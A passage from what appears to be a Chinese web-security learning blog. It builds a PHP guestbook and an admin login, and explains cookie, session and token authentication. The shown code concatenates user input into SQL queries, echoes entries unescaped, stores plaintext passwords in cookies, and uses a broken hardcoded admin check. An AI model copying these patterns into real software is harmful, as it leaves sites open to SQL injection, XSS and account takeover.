数据库用户名</span></span><br><span class="line"><span class="comment">// $dbpass: 数据库用户的密码</span></span><br><span class="line"><span class="comment">// $dbname: 要连接的数据库名*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*$dbip=&#x27;localhost&#x27;;</span></span><br><span class="line"><span class="comment">$dbuser=&#x27;root&#x27;;</span></span><br><span class="line"><span class="comment">$dbpass=&#x27;root&#x27;;</span></span><br><span class="line"><span class="comment">$dbname=&#x27;dome01&#x27;;</span></span><br><span class="line"><span class="comment">$con=mysqli_connect($dbip,$dbuser,$dbpass,$dbname);*/</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加留言</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_gbook</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$u</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$u</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$c</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$i</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]; <span class="comment">/*获取客户端 IP 地址*/</span></span><br><span class="line">        <span class="variable">$ua</span> = @<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="comment">/*获取客户端用户代理信息*/</span></span><br><span class="line">        <span class="comment">// 数据库查询语句，将数据插入到名为 gbook 的表中</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) value(&#x27;<span class="subst">$u</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;,&#x27;<span class="subst">$i</span>&#x27;,&#x27;<span class="subst">$ua</span>&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示留言</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">show_gbook</span>(<span class="params"><span class="variable">$con</span>,<span class="variable">$del</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql1</span>=<span class="string">&quot;select * from gbook&quot;</span>;</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;用户名：&#x27;</span> . <span class="variable">$row</span>[<span class="number">0</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;IP地址：&#x27;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;UA浏览器：&#x27;</span> . <span class="variable">$row</span>[<span class="number">3</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//检查变量 $del 是否等于字符串 &#x27;del&#x27;。如果条件成立，就会生成一个包含删除链接的 HTML 代码。</span></span><br><span class="line">                <span class="comment">//提供删除链接，传递留言用户名作为参数</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$del</span>==<span class="string">&#x27;del&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;gbook-admin.php?del=<span class="subst">$row</span>[0]&#x27;&gt;删除&lt;/a&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_gbook</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="comment">// 调用显示留言的函数，传递 &#x27;x&#x27; 参数</span></span><br><span class="line"><span class="title function_ invoke__">show_gbook</span>(<span class="variable">$con</span>,<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 包含数据库配置文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 包含处理留言的功能文件</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../gbook.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用显示留言的函数，传递 &#x27;del&#x27; 参数，以显示删除链接</span></span><br><span class="line"><span class="title function_ invoke__">show_gbook</span>(<span class="variable">$con</span>,<span class="string">&#x27;del&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要删除的留言用户名</span></span><br><span class="line"><span class="variable">$delstr</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span><br><span class="line"><span class="comment">// 检查是否设置了要删除的留言用户名</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$delstr</span>))&#123;</span><br><span class="line">    <span class="comment">// 构建删除留言的 SQL 查询语句</span></span><br><span class="line">    <span class="variable">$sql2</span>=<span class="string">&quot;delete from gbook where username =&#x27;<span class="subst">$delstr</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">// 执行删除操作</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有留言</span></span><br><span class="line"><span class="comment">/*$sql1=&quot;select * from gbook&quot;;</span></span><br><span class="line"><span class="comment">$data=mysqli_query($con,$sql1);</span></span><br><span class="line"><span class="comment">// 循环遍历每条留言并显示信息和删除链接</span></span><br><span class="line"><span class="comment">while ($row=mysqli_fetch_row($data))&#123;</span></span><br><span class="line"><span class="comment">    echo &#x27;&lt;hr&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    echo &#x27;UA浏览器：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">    // 提供删除链接，传递留言用户名作为参数</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;a href=&#x27;gbook-admin.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*配置全局文件。如果有用到数据库链接的时候直接包含此文件即可*/</span></span><br><span class="line"><span class="variable">$dbip</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">&#x27;dome01&#x27;</span>;</span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$dbip</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure><h1 id="后台验证功能"><a href="#后台验证功能" class="headerlink" title="后台验证功能"></a>后台验证功能</h1><h2 id="身份验证-Cookie"><a href="#身份验证-Cookie" class="headerlink" title="身份验证-Cookie"></a>身份验证-Cookie</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731659837196-3a7b23d9-d34c-48e2-9a20-48ff19c1f412.png"></p><blockquote><p>生成cookie的原理图过程：见图</p><p>1、客户端向服务器发送HTTP请求。</p><p>2、服务器检查请求头中是否包含cookie信息。</p><p>3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。</p><p>4、服务器在响应头中设置cookie信息并将其发送回客户端。</p><p>5、客户端接收响应并将cookie保存在本地。</p><p>6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。</p><p>7、服务器收到请求并检查cookie的有效性。</p><p>8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。</p></blockquote><p>php函数</p><p>setcookie(): 设置一个cookie并发送到客户端浏览器。</p><p>unset(): 用于删除指定的cookie。</p><p>Cookie安全性</p><p>信息泄露：如果Cookie中包含敏感信息（如用户ID、密码等），攻击者可以通过窃取Cookie来获取这些敏感数据。为了防止信息泄露，应确保敏感信息在传输和存储过程中进行加密，并使用安全的传输协议（如HTTPS）来保护Cookie的传输过程。</p><p>跨站点脚本攻击（XSS）：攻击者可以通过在Web应用程序中注入恶意脚本来获取用户的Cookie。为了防止XSS攻击，开发人员应对用户输入进行正确的验证和过滤，并对输出进行适当的转义，以防止恶意脚本的注入。</p><p>跨站点请求伪造（CSRF）：攻击者可以通过欺骗用户访问恶意网站来利用用户的身份进行非法操作。为了防止CSRF攻击，可以使用随机生成的令牌（CSRF令牌）来验证每个请求的合法性，并确保令牌在每个请求中都是唯一且难以预测的。</p><p>会话劫持：攻击者可以通过窃取用户的会话Cookie来冒充用户身份。为了防止会话劫持，可以通过使用安全标志（如”Secure”和”HttpOnly”）来限制Cookie的使用范围，并在会话身份验证上使用额外的保护措施，如双因素身份验证。</p><p>不安全的存储：如果Cookie存储在用户计算机上的不安全位置，如明文存储或不加密的存储，攻击者可以轻易地访问和修改Cookie。为了保护Cookie的存储，应将Cookie存储在安全的位置，如服务器端的数据库或加密的本地存储。</p><h2 id="身份验证-Session"><a href="#身份验证-Session" class="headerlink" title="身份验证-Session"></a>身份验证-Session</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731660099748-fe1f1df0-1ae2-47f3-9151-9c81bc4c4e9b.png"></p><blockquote><p>session生成过程</p><p>1、客户端向服务器发送HTTP请求。</p><p>2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。</p><p>3、服务器将生成的session ID作为一个cookie发送给客户端。</p><p>4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。</p><p>5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。</p><p>6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据。</p></blockquote><p>session函数</p><p>session_start(): 启动会话，用于开始或恢复一个已经存在的会话。</p><p>$_SESSION: 用于存储和访问当前会话中的所有变量。</p><p>session_destroy(): 销毁当前会话中的所有数据。</p><p>session_unset(): 释放当前会话中的所有变量。</p><p>Session存储路径：PHP.INI中session.save_path设置路径：</p><h2 id="Cookie和Session的区别"><a href="#Cookie和Session的区别" class="headerlink" title="Cookie和Session的区别"></a>Cookie和Session的区别</h2><p>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制</p><p>1、存储位置不同：</p><p>Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p><p>2、安全性不同：</p><p>Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p><p>3、存储容量不同：</p><p>Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p><p>4、生命周期不同：</p><p>Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p><p>5、访问方式不同：</p><p>Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p><p>6、使用场景不同：</p><p>Cookie一般用于存储小型的数据，如用户的用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p><p>总之，Cookie和Session都有各自的优缺点，选择使用哪一种方式，取决于具体的应用场景和需求。一般来说，如果需要存储敏感信息或者数据较大，建议使用Session；如果只需要存储少量的数据，并且需要在客户端进行访问，可以选择使用Cookie。</p><h2 id="唯一性判断-Token"><a href="#唯一性判断-Token" class="headerlink" title="唯一性判断-Token"></a>唯一性判断-Token</h2><p>在Web应用程序中，使用token和不使用token的主要差异在于身份验证和安全性。</p><p>1.身份验证：采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在每次请求时发送给服务器进行身份验证。而不采用token机制的Web应用程序，一般会使用session机制来保存用户登录状态，服务器会在用户登录成功后创建一个session，之后的每个请求都需要在HTTP头中附带这个session ID，以便服务器能够验证用户身份。</p><p>2、安全性：采用token机制的Web应用程序，在服务器上不会存储用户的登录状态，只需要存储token即可。因此，即使token被盗取，黑客也无法获得用户的密码或者其他敏感信息。而不采用token机制的Web应用程序，一般会在服务器上存储用户的登录状态，因此如果服务器被黑客攻击，黑客可能会获得用户的敏感信息。</p><p>3、跨域访问：采用token机制的Web应用程序，在跨域访问时，可以使用HTTP头中的Authorization字段来传递token信息，方便实现跨域访问。而不采用token机制的Web应用程序，在跨域访问时，需使用cookie或session来传递用户身份信息，比较麻烦。</p><p>总之，采用token机制可以提高Web应用程序的安全性，并且方便实现跨域访问。不过，使用token机制也需要开发者自己来实现身份验证和token的生成和验证，相对来说比较复杂。而不采用token机制，**使用session机制则相对简单，但是安全性相对较低。**因此，具体采用哪种机制，需要根据实际情况进行权衡和选择。</p><blockquote><p>使用token之后，无法进行抓包爆破，即使抓包爆破有正确账户密码，但是抓包的token是写死的，而token每次是随机生成的，经token检验也会登录失败；可以正常使用网站功能登录，在网站登录时每次登录的token会与服务器端同步</p></blockquote><h2 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: <span class="comment">#f4f4f4;</span></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            background-color: <span class="comment">#fff;</span></span><br><span class="line">            border-radius: <span class="number">8</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: <span class="number">8</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">8</span>px;</span><br><span class="line">            margin-bottom: <span class="number">16</span>px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button &#123;</span><br><span class="line">            background-color: <span class="comment">#4caf50;</span></span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#45a049;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--<span class="comment">//你需要在实际应用中将登录表单的 action</span></span><br><span class="line"><span class="comment">//属性指向后台处理登录的脚本（例如 login.php）</span></span><br><span class="line"><span class="comment">//由于当前就是登录文件为空即可--&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;../config.php&quot;</span>;</span><br><span class="line"><span class="comment">//登陆文件</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1.接收输入账号密码</span></span><br><span class="line"><span class="comment"> * 2.判断账号密码是否正确</span></span><br><span class="line"><span class="comment"> * 3.正确后生成cookie进行保存</span></span><br><span class="line"><span class="comment"> * 4.错误的账户密码进行提示</span></span><br><span class="line"><span class="comment"> * 5.跳转至成功页面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//1.接收输入账号密码</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">//2.进行判断账号密码是否正确</span></span><br><span class="line"><span class="comment">// 构建 SQL 查询语句，用于判断账号密码是否正确</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $sql;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 SQL 查询</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断请求是否为 POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查查询结果行数是否大于 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$expire</span> = <span class="title function_ invoke__">time</span>() + <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span>; <span class="comment">// 设置 Cookie 过期时间为一个月后</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$expire</span>, <span class="string">&#x27;/&#x27;</span>); <span class="comment">// 设置用户名 Cookie</span></span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>, <span class="variable">$pass</span>, <span class="variable">$expire</span>, <span class="string">&#x27;/&#x27;</span>); <span class="comment">// 设置密码 Cookie</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重定向到 index-c.php 页面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index-c.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();  <span class="comment">// 终止脚本执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录失败！&#x27;)&lt;/script&gt;&quot;</span>; <span class="comment">// 输出登录失败的提示</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//登录成功的首页文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="string">&#x27;admin&#x27;</span><span class="keyword">and</span><span class="variable">$_COOKIE</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    <span class="comment">// 重定向到 index-c.php 页面</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index-c.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后台首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;后台首页&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;欢迎您，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;logout-c.php&quot;</span>&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="comment">// 跳转到登录页面</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: admin-c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: <span class="comment">#f4f4f4;</span></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            background-color: <span class="comment">#fff;</span></span><br><span class="line">            border-radius: <span class="number">8</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: <span class="number">8</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">8</span>px;</span><br><span class="line">            margin-bottom: <span class="number">16</span>px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button &#123;</span><br><span class="line">            background-color: <span class="comment">#4caf50;</span></span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#45a049;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--<span class="comment">//你需要在实际应用中将登录表单的 action</span></span><br><span class="line"><span class="comment">//属性指向后台处理登录的脚本（例如 login.php）</span></span><br><span class="line"><span class="comment">//由于当前就是登录文件为空即可--&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;../config.php&quot;</span>;</span><br><span class="line"><span class="comment">//登陆文件,使用session验证</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1.接收输入账号密码</span></span><br><span class="line"><span class="comment"> * 2.判断账号密码是否正确</span></span><br><span class="line"><span class="comment"> * 3.正确后生成cookie进行保存</span></span><br><span class="line"><span class="comment"> * 4.错误的账户密码进行提示</span></span><br><span class="line"><span class="comment"> * 5.跳转至成功页面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span 